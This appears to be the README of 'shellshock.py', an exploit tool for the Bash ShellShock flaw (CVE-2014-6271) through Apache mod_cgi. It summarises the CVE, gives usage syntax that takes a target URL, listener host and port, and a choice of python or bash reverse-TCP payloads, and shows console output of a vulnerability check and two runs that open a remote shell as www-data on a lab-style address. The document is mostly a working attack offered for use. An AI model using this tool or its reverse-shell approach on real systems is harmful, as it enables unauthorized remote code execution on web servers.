# shellshock.py

## Summary

CVE-2014-6271 - GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment 
variables, which allows remote attackers to execute arbitrary code via a crafted environment, as demonstrated by vectors 
involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts 
executed by unspecified DHCP clients, and other situations in which setting the environment occurs across a privilege 
boundary from Bash execution, aka "ShellShock." NOTE: the original fix for this issue was incorrect; CVE-2014-7169 has 
been assigned to cover the vulnerability that is still present after the incorrect fix. 

This code exploit the mod_cgi shellshock issue

## Usage

Run ./shellshock.py to get the usage menu.

```bash
⬢  shellshock  feature_shellshock ⦿ ./shellshock.py 

   ▄▄▄▄▄    ▄  █ ▄███▄   █    █      ▄▄▄▄▄    ▄  █ ████▄ ▄█▄    █  █▀ 
  █     ▀▄ █   █ █▀   ▀  █    █     █     ▀▄ █   █ █   █ █▀ ▀▄  █▄█   
▄  ▀▀▀▀▄   ██▀▀█ ██▄▄    █    █   ▄  ▀▀▀▀▄   ██▀▀█ █   █ █   ▀  █▀▄   
 ▀▄▄▄▄▀    █   █ █▄   ▄▀ ███▄ ███▄ ▀▄▄▄▄▀    █   █ ▀████ █▄  ▄▀ █  █  
              █  ▀███▀       ▀    ▀             █        ▀███▀    █   
             ▀                                 ▀                 ▀    
[nighter@nighter.se]
    
Usage: ./shellshock.py <URL> <LHOST> <LPORT> [1=python_reverse_tcp|2=bash_reverse_tcp]

EXAMPLE: ./shellshock.py 'http://127.0.0.1/cgi-bin/admin.cgi' 10.10.14.24 1337 1
EXAMPLE: ./shellshock.py 'http://127.0.0.1/cgi-bin/admin.cgi' check
```        

## Check if service is vulnerable

```bash
⬢  shellshock  feature_shellshock ⦿ ./shellshock.py 'http://10.11.xx.xx/cgi-bin/admin.cgi' check             
[+] http://10.11.xx.xx/cgi-bin/admin.cgi is vulnerable
```

Run exploit with python reverse_tcp payload.

```bash
⬢  shellshock  feature_shellshock ⦿ ./shellshock.py 'http://10.11.xx.xx/cgi-bin/admin.cgi' 10.11.0.xx 1337 1
[+] LHOST = 10.11.0.xx
[+] Shell listen
[+] python reverse_tcp payload
www-data@alpha:/usr/lib/cgi-bin$ whoami
www-data
```

Run bash reverse tcp payload

```bash
⬢  shellshock  feature_shellshock ⦿ ./shellshock.py 'http://10.11.xx.xx/cgi-bin/admin.cgi' 10.11.0.xx 1337 2
[+] LHOST = 10.11.0.xx
[+] Netcat = 1337
[+] bash reverse_tcp payload
Connection from 10.11.xx.xx:58265
bash: cannot set terminal process group (1224): Inappropriate ioctl for device
bash: no job control in this shell
www-data@alpha:/usr/lib/cgi-bin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```